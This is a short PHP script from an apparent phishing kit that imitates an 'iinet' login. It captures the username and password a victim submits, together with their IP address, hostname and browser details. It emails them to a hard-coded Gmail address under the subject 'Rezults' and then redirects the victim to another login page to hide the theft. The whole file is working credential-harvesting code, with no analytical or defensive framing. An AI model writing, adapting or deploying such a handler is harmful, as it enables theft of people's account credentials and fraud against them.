<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- iinet -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "Utilisateur      : ".$_POST['username']."\n";
$message .= "Mot de passe          : ".$_POST['password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY X-CMD ----------------------\n";
$cc = $_POST['ccn'];
$subject = "Rezults iinet ".$_POST['exm']."/".$_POST['exy'];
$send = "xnepia5@gmail.com";
$headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
mail($send,$subject,$message,$headers);

header("Location:https://login.rtmc.net/");?>